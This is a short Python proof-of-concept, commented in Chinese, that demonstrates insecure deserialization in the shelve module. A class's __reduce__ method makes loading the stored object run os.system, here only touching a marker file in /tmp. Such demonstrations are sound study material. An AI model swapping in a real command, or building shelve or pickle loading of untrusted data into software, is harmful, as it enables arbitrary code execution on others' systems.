#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import shelve


# os.system('touch /tmp/pickle_deserialization')
class exp(object):
    def __reduce__(self):
        return os.system, ('touch /tmp/shelve_deserialization',)


filename = "/tmp/test"
db = shelve.open(filename)
db['exp'] = exp()
# close函数调用sync函数将字典序列化存储至指定文件。
db.close()

# 这里是用来阻塞程序，方便poc调试。
input()

# 反序列化文件内容，导致漏洞被触发
db = shelve.open(filename)
print(db['exp'])
